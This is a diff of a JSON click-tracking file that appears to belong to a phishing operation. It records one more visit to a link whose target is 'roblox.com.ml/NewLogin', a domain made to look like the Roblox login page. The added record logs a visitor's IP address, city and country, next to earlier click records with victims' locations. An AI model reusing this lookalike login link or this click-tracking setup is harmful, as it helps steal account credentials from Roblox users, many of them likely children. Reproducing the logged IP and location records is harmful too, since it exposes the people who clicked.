@@ -110,7 +110,7 @@
     "targetUrl": "https://www.roblox.com.ml/NewLogin?returnUrl=https%3A%2F%2Fwww.roblox.com%2Fcommunities%2F296844474575%2FKeyPermanent",
     "createdAt": 1776592397121,
     "status": "active",
-    "useCount": 61,
+    "useCount": 62,
     "createdBy": "admin",
     "clicks": [
       {
@@ -600,6 +600,14 @@
         "city": "Sighetu Marmaţiei",
         "flag": "🇷🇴",
         "countryCode": "RO"
+      },
+      {
+        "timestamp": 1776878595271,
+        "ip": "91.17.130.245",
+        "country": "Germany",
+        "city": "Krefeld",
+        "flag": "🇩🇪",
+        "countryCode": "DE"
       }
     ]
   },
